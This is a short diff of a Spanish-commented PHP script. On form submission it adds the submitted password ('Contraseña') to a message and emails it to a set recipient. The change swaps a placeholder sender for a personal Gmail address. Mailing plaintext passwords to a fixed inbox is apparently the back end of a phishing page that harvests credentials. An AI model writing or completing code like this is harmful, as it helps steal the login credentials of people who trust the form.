@@ -14,7 +14,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $message .= "Contraseña: " . $password;
 
     // Cabeceras del correo electrónico
-    $headers = "From: tu_correo_electronico@gmail.com";
+    $headers = "From: armin5727214@gmail.com";
 
     // Envía el correo electrónico
     if (mail($to, $subject, $message, $headers)) {
